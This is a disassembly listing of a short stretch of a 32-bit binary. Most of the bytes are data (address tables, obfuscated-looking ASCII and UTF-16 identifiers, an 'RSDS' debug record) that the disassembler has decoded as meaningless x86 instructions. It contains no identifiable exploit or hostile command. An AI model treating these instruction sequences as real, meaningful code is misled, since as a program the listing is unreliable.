  4335d6:	add    BYTE PTR [ecx],al
  4335d8:	add    BYTE PTR [eax],dl
  4335da:	add    al,ah
  4335dc:	pop    ebp
  4335dd:	adc    BYTE PTR [eax],al
  4335df:	add    ah,BYTE PTR ds:0x328d0010
  4335e5:	adc    BYTE PTR [eax],al
  4335e7:	xchg   DWORD PTR [ecx],edx
  4335e9:	adc    BYTE PTR [eax],al
  4335eb:	ja     0x4335f9
  4335ed:	adc    BYTE PTR [eax],al
  4335ef:	add    cl,BYTE PTR [eax]
  4335f1:	adc    BYTE PTR [eax],al
  4335f3:	jle    0x433669
  4335f5:	adc    BYTE PTR [eax],al
  4335f7:	xlat   BYTE PTR ds:[ebx]
  4335f8:	xor    eax,0x35db0043
  4335fd:	inc    ebx
  4335fe:	add    bh,bl
  433600:	xor    eax,0x35e30043
  433605:	inc    ebx
  433606:	add    bh,ah
  433608:	xor    eax,0x35eb0043
  43360d:	inc    ebx
  43360e:	add    bh,ch
  433610:	xor    eax,0x35f30043
  433615:	inc    ebx
  433616:	add    BYTE PTR [esi+0x12],bl
  433619:	adc    BYTE PTR [eax],al
  43361b:	stc    
  43361c:	push   es
  43361d:	adc    BYTE PTR [eax],al
  43361f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433620:	xor    DWORD PTR [eax],edx
  433622:	add    BYTE PTR [eax+0x7b],dl
  433625:	adc    BYTE PTR [eax],al
  433627:	stos   DWORD PTR es:[edi],eax
  433628:	push   edi
  433629:	adc    BYTE PTR [eax],al
  43362b:	inc    ebp
  43362c:	adc    edx,DWORD PTR [eax]
  43362e:	add    BYTE PTR [eax+0x38],ch
  433631:	adc    BYTE PTR [eax],al
  433633:	pop    ecx
  433634:	and    edx,DWORD PTR [eax]
  433636:	add    BYTE PTR [edi],dl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [ebx],bl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [edi],bl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [ebx],ah
  433644:	ss inc ebx
  433646:	add    BYTE PTR [edi],ah
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [ebx],ch
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [edi],ch
  433650:	ss inc ebx
  433652:	add    BYTE PTR [ebx],dh
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ecx+0x72],cl
  433659:	adc    BYTE PTR [eax],al
  43365b:	cmp    edi,DWORD PTR [eax+0x10]
  43365e:	add    BYTE PTR [ebx+0x23],dl
  433661:	adc    BYTE PTR [eax],al
  433663:	jno    0x4336d1
  433665:	adc    BYTE PTR [eax],al
  433667:	pop    eax
  433668:	outs   dx,BYTE PTR ds:[esi]
  433669:	adc    BYTE PTR [eax],al
  43366b:	mov    ebx,DWORD PTR [ebx+0x10]
  43366e:	add    BYTE PTR [ebx+ebx*2],ch
  433671:	adc    BYTE PTR [eax],al
  433673:	retf   0x1066
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [ebx+0x32],al
  433699:	xor    dh,BYTE PTR ds:0x5a52345f
  43369f:	push   esp
  4336a0:	xor    BYTE PTR [esi],dh
  4336a2:	add    BYTE PTR [ecx+0x36],cl
  4336a5:	push   eax
  4336a6:	pop    edi
  4336a7:	ss inc ebx
  4336a9:	ss pop edx
  4336ab:	xor    ebx,DWORD PTR [edi+0x52]
  4336ae:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4336b2:	pop    edi
  4336b3:	dec    esi
  4336b4:	dec    esp
  4336b5:	dec    eax
  4336b6:	xor    esi,DWORD PTR [edx]
  4336b8:	pop    edi
  4336b9:	xor    al,0x4b
  4336bb:	add    BYTE PTR [eax+0x49],cl
  4336be:	push   ebp
  4336bf:	xor    al,0x5f
  4336c1:	dec    esp
  4336c2:	inc    edx
  4336c3:	dec    ecx
  4336c4:	cmp    DWORD PTR [edi+ebx*2],esi
  4336c7:	pop    ecx
  4336c8:	inc    edi
  4336c9:	add    BYTE PTR [eax+0x50],bl
  4336cc:	dec    eax
  4336cd:	pop    edi
  4336ce:	push   ebp
  4336cf:	push   ecx
  4336d0:	inc    edi
  4336d1:	xor    cl,BYTE PTR [edx+0x38]
  4336d4:	push   esi
  4336d5:	add    BYTE PTR [ebx+0x4a],al
  4336d8:	push   edx
  4336d9:	pop    edi
  4336da:	dec    edi
  4336db:	dec    eax
  4336dc:	dec    edi
  4336dd:	dec    edi
  4336de:	dec    edx
  4336df:	add    BYTE PTR [ecx+0x52],al
  4336e2:	cmp    DWORD PTR [edi+0x56],ebx
  4336e5:	aaa    
  4336e6:	dec    esp
  4336e7:	cmp    DWORD PTR [ebx+0x5f],eax
  4336ea:	push   edx
  4336eb:	inc    esp
  4336ec:	add    BYTE PTR [ecx+0x37],bl
  4336ef:	inc    esp
  4336f0:	pop    edi
  4336f1:	dec    ecx
  4336f2:	xor    esi,DWORD PTR [edi]
  4336f4:	xor    DWORD PTR [edi+0x49],ebx
  4336f7:	push   esp
  4336f8:	xor    eax,DWORD PTR [eax]
  4336fa:	push   edx
  4336fb:	xor    BYTE PTR [eax+0x5f],bl
  4336fe:	dec    eax
  4336ff:	push   edi
  433700:	inc    esi
  433701:	xor    DWORD PTR [edi+0x5f],edx
  433704:	cmp    BYTE PTR [ebx+0x37],dl
  433707:	add    BYTE PTR [esi+0x42],dl
  43370a:	dec    ecx
  43370b:	xor    ebx,DWORD PTR [edi+0x45]
  43370e:	xor    BYTE PTR [ebp+0x5f],cl
  433711:	xor    al,0x34
  433713:	xor    BYTE PTR [edx+0x5f],cl
  433716:	inc    edi
  433717:	add    BYTE PTR [edx+0x57],dl
  43371a:	xor    ebx,DWORD PTR [edi+0x31]
  43371d:	dec    edx
  43371e:	push   edi
  43371f:	xor    eax,0x4d435f
  433724:	dec    ecx
  433725:	xor    eax,0x36365f39
  43372a:	dec    eax
  43372b:	xor    BYTE PTR [eax],al
  43372d:	dec    edi
  43372e:	inc    ebx
  43372f:	push   edi
  433730:	pop    edi
  433731:	inc    edi
  433732:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  433737:	add    BYTE PTR [edx+0x58],al
  43373a:	inc    edi
  43373b:	ss pop edi
  43373d:	push   esi
  43373e:	inc    ebx
  43373f:	dec    esi
  433740:	inc    esp
  433741:	add    BYTE PTR [edi+0x4d],cl
  433744:	inc    edi
  433745:	xor    ebx,DWORD PTR [edi+0x34]
  433748:	dec    esi
  433749:	pop    edx
  43374a:	cmp    BYTE PTR [edi+0x58],bl
  43374d:	cmp    BYTE PTR [eax],al
  43374f:	push   edx
  433750:	pop    eax
  433751:	push   ecx
  433752:	pop    edi
  433753:	dec    esp
  433754:	push   edx
  433755:	dec    ecx
  433756:	dec    edi
  433757:	inc    esp
  433758:	pop    edi
  433759:	dec    edi
  43375a:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43375e:	push   eax
  43375f:	inc    ebp
  433760:	pop    edi
  433761:	xor    eax,0x565f3945
  433766:	add    BYTE PTR [edi+0x4e],al
  433769:	push   esi
  43376a:	pop    edi
  43376b:	inc    edi
  43376c:	push   esp
  43376d:	dec    eax
  43376e:	xor    dh,BYTE PTR [ecx]
  433770:	pop    edi
  433771:	dec    edi
  433772:	xor    eax,DWORD PTR ss:[eax]
  433775:	inc    esp
  433776:	inc    ebp
  433777:	dec    ecx
  433778:	pop    edi
  433779:	push   edx
  43377a:	dec    eax
  43377b:	xor    al,0x48
  43377d:	dec    ecx
  43377e:	ss pop edi
  433780:	aaa    
  433781:	aaa    
  433782:	dec    ecx
  433783:	dec    ebp
  433784:	add    BYTE PTR [eax+0x54],cl
  433787:	ss pop edi
  433789:	inc    esi
  43378a:	inc    edx
  43378b:	xor    dh,BYTE PTR [eax+eax*1]
  43378e:	dec    esi
  43378f:	ss dec edx
  433791:	pop    edi
  433792:	dec    ecx
  433793:	dec    esp
  433794:	inc    edi
  433795:	inc    esp
  433796:	dec    eax
  433797:	xor    BYTE PTR [eax],bh
  433799:	xor    eax,0x4c344f00
  43379e:	xor    esi,DWORD PTR [edi]
  4337a0:	xor    BYTE PTR [edi+0x44],bl
  4337a3:	inc    edi
  4337a4:	dec    ebx
  4337a5:	xor    al,BYTE PTR [ecx+0x43]
  4337a8:	add    BYTE PTR [edi+0x32],cl
  4337ab:	xor    ebx,DWORD PTR [edi+0x57]
  4337ae:	xor    cl,BYTE PTR [edi+0x5f]
  4337b1:	pop    edx
  4337b2:	add    BYTE PTR [eax+0x4c],bl
  4337b5:	cmp    DWORD PTR [edi+0x4b],ebx
  4337b8:	inc    ecx
  4337b9:	dec    edx
  4337ba:	inc    esi
  4337bb:	xor    DWORD PTR [edi+ebx*2],esi
  4337be:	pop    eax
  4337bf:	inc    edi
  4337c0:	inc    edx
  4337c1:	add    BYTE PTR [eax+0x33],dl
  4337c4:	dec    esi
  4337c5:	pop    edi
  4337c6:	dec    eax
  4337c7:	xor    eax,0x485f53
  4337cc:	dec    ebp
  4337cd:	xor    BYTE PTR [edx+0x5f],al
  4337d0:	dec    edx
  4337d1:	pop    eax
  4337d2:	push   esp
  4337d3:	dec    ecx
  4337d4:	dec    esp
  4337d5:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  4337d9:	xor    esi,DWORD PTR [eax]
  4337db:	pop    edi
  4337dc:	inc    ecx
  4337dd:	pop    edx
  4337de:	push   ecx
  4337df:	pop    edx
  4337e0:	cmp    DWORD PTR [esi],esi
  4337e2:	pop    edi
  4337e3:	dec    eax
  4337e4:	dec    esp
  4337e5:	pop    edx
  4337e6:	add    BYTE PTR [ecx+0x57],dl
  4337e9:	pop    ecx
  4337ea:	pop    edi
  4337eb:	push   esi
  4337ec:	xor    al,0x44
  4337ee:	xor    DWORD PTR [eax],edi
  4337f0:	xor    bl,BYTE PTR [edi+0x39]
  4337f3:	push   esp
  4337f4:	push   esp
  4337f5:	add    BYTE PTR [esi+0x0],dl
  4337f8:	dec    edi
  4337f9:	add    BYTE PTR [edi+0x0],al
  4337fc:	add    BYTE PTR ss:[edi+0x0],bl
  433800:	dec    edi
  433801:	add    BYTE PTR [edx+0x0],bl
  433804:	inc    ebp
  433805:	add    BYTE PTR [eax],dh
  433807:	add    BYTE PTR [ebp+0x0],al
  43380a:	xor    BYTE PTR [eax],al
  43380c:	pop    edi
  43380d:	add    BYTE PTR [eax],dh
  43380f:	add    BYTE PTR ds:0x4f000000,dh
  433815:	add    BYTE PTR ds:0x5f005700,dh
  43381b:	add    BYTE PTR [edi],dh
  43381d:	add    BYTE PTR [ebx+0x0],dl
  433820:	push   ebp
  433821:	add    BYTE PTR [edi+0x0],al
  433824:	xor    al,0x0
  433826:	pop    edi
  433827:	add    BYTE PTR [ecx+0x0],dl
  43382a:	inc    esp
  43382b:	add    BYTE PTR [eax],al
  43382d:	add    BYTE PTR [edx+0x0],dl
  433830:	push   esp
  433831:	add    BYTE PTR ds:0x52005f00,dh
  433837:	add    BYTE PTR [edi+0x0],dl
  43383a:	xor    al,BYTE PTR [eax]
  43383c:	xor    al,BYTE PTR [eax]
  43383e:	xor    BYTE PTR [eax],al
  433840:	xor    BYTE PTR [eax],al
  433842:	pop    edi
  433843:	add    BYTE PTR [esi],dh
  433845:	add    BYTE PTR [eax],al
  433847:	add    BYTE PTR [eax+0x0],cl
  43384a:	inc    ebp
  43384b:	add    BYTE PTR [eax+eax*1+0x30],cl
  43384f:	add    BYTE PTR [edi+0x0],bl
  433852:	dec    edx
  433853:	add    BYTE PTR [edx],dh
  433855:	add    BYTE PTR [edi],dh
  433857:	add    BYTE PTR [ebp+0x0],dl
  43385a:	add    BYTE PTR ss:[eax],dh
  43385d:	add    BYTE PTR [eax],al
  43385f:	add    BYTE PTR [esi+0x0],dl
  433862:	cmp    BYTE PTR [eax],al
  433864:	dec    edi
  433865:	add    BYTE PTR [ecx],bh
  433867:	add    BYTE PTR [edi+0x0],bl
  43386a:	pop    eax
  43386b:	add    BYTE PTR [edx+0x0],bl
  43386e:	dec    esp
  43386f:	add    BYTE PTR [ebx+0x0],cl
  433872:	add    BYTE PTR [eax],al
  433874:	dec    ecx
  433875:	add    BYTE PTR [ebp+0x0],dl
  433878:	dec    edi
  433879:	add    BYTE PTR [eax],bh
  43387b:	add    BYTE PTR [edi+0x0],bl
  43387e:	inc    esp
  43387f:	add    BYTE PTR [eax],bh
  433881:	add    BYTE PTR [ecx+0x0],cl
  433884:	dec    eax
  433885:	add    BYTE PTR [edi+0x0],cl
  433888:	pop    edi
  433889:	add    BYTE PTR [ebp+0x0],al
  43388c:	pop    eax
  43388d:	add    BYTE PTR [eax],al
  43388f:	add    BYTE PTR [edx+0x0],dl
  433892:	dec    esp
  433893:	add    BYTE PTR [esi],dh
  433895:	add    BYTE PTR [edi+0x0],bl
  433898:	aaa    
  433899:	add    BYTE PTR [eax+0x0],bl
  43389c:	xor    eax,DWORD PTR [eax]
  43389e:	inc    edi
  43389f:	add    BYTE PTR [ecx+0x0],dl
  4338a2:	pop    edi
  4338a3:	add    BYTE PTR [edx+0x0],cl
  4338a6:	add    BYTE PTR [eax],al
  4338a8:	inc    edi
  4338a9:	add    BYTE PTR [edi+0x0],cl
  4338ac:	push   ebx
  4338ad:	add    BYTE PTR [eax+eax*1],dh
  4338b0:	pop    edi
  4338b1:	add    BYTE PTR [ecx+0x0],cl
  4338b4:	xor    DWORD PTR [eax],eax
  4338b6:	push   esi
  4338b7:	add    BYTE PTR [ebx],dh
  4338b9:	add    BYTE PTR [edi+0x0],bl
  4338bc:	dec    ecx
  4338bd:	add    BYTE PTR [edx+0x0],bl
  4338c0:	add    BYTE PTR [eax],al
  4338c2:	inc    ebx
  4338c3:	add    BYTE PTR [ecx+0x0],bl
  4338c6:	inc    ecx
  4338c7:	add    BYTE PTR [eax],dh
  4338c9:	add    BYTE PTR [ecx],bh
  4338cb:	add    BYTE PTR [edi+0x0],bl
  4338ce:	cmp    DWORD PTR [eax],eax
  4338d0:	push   eax
  4338d1:	add    BYTE PTR [eax+eax*1],dh
  4338d4:	pop    edx
  4338d5:	add    BYTE PTR [eax],al
  4338d7:	add    BYTE PTR [edx+0x0],al
  4338da:	inc    esi
  4338db:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4338df:	add    BYTE PTR [ebp+0x0],dl
  4338e2:	push   ebp
  4338e3:	add    BYTE PTR [eax+eax*1+0x57],dl
  4338e7:	add    BYTE PTR [eax],al
  4338e9:	add    BYTE PTR [eax+eax*1+0x37],dl
  4338ed:	add    BYTE PTR [eax+eax*1+0x38],dl
  4338f1:	add    BYTE PTR [edi+0x0],bl
  4338f4:	xor    eax,DWORD PTR [eax]
  4338f6:	cmp    DWORD PTR [eax],eax
  4338f8:	dec    eax
  4338f9:	add    BYTE PTR [edi+0x0],bl
  4338fc:	dec    ebp
  4338fd:	add    BYTE PTR [ecx+0x0],bl
  433900:	cmp    DWORD PTR [eax],eax
  433902:	inc    ecx
  433903:	add    BYTE PTR [esi+0x0],cl
  433906:	add    BYTE PTR [eax],al
  433908:	inc    ebx
  433909:	add    BYTE PTR [eax+0x0],dl
  43390c:	dec    esi
  43390d:	add    BYTE PTR [eax+eax*1],dh
  433910:	pop    edi
  433911:	add    BYTE PTR [eax+eax*1+0x54],cl
  433915:	add    BYTE PTR [ebx+0x0],cl
  433918:	xor    DWORD PTR [eax],eax
  43391a:	add    BYTE PTR [eax],al
  43391c:	inc    ecx
  43391d:	add    BYTE PTR [edi],dh
  43391f:	add    BYTE PTR [edx+0x0],cl
  433922:	pop    edi
  433923:	add    BYTE PTR [ebx+0x0],al
  433926:	cmp    BYTE PTR [eax],al
  433928:	push   edi
  433929:	add    BYTE PTR [eax+0x0],dl
  43392c:	pop    edi
  43392d:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433931:	add    BYTE PTR [edx],dh
  433933:	add    BYTE PTR [eax],al
  433935:	add    BYTE PTR [edx+0x0],al
  433938:	add    BYTE PTR [eax],al
  43393a:	push   edx
  43393b:	push   ebx
  43393c:	inc    esp
  43393d:	push   ebx
  43393e:	mov    esi,ds
  433940:	jle    0x4339bc
  433942:	adc    eax,0x844d6bc5
  433947:	inc    ecx
  433948:	jmp    0x43396e
  43394a:	xchg   esi,eax
  43394b:	scas   eax,DWORD PTR es:[edi]
  43394c:	mov    edi,0x130c
  433951:	add    BYTE PTR [edi+0x3a],cl
  433954:	pop    esp
  433955:	jno    0x4339ab
  433957:	inc    esp
  433958:	jp     0x4339a8
  43395a:	jb     0x4339b6
  43395c:	addr16 jne 0x4339c2
  43395f:	jns    0x4339d1
  433961:	jbe    0x4339bf
  433963:	push   0x62
  433965:	push   edi
  433966:	jns    0x4339e0
  433968:	inc    ebp
  433969:	ins    DWORD PTR es:[edi],dx
  43396a:	jbe    0x4339d3
  43396c:	popa   
  43396d:	pop    esp
  43396e:	je     0x4339da
  433970:	pop    edx
  433971:	data16 jne 0x4339e6
  433974:	ja     0x4339de
  433976:	push   edx
  433977:	bound  eax,QWORD PTR [ebp+0x72]
  43397a:	pop    esp
  43397b:	dec    edx
  43397c:	jae    0x4339c2
  43397e:	ins    DWORD PTR es:[edi],dx
  43397f:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433983:	jo     0x4339e9
  433985:	bound  eax,QWORD PTR [eax]
	...
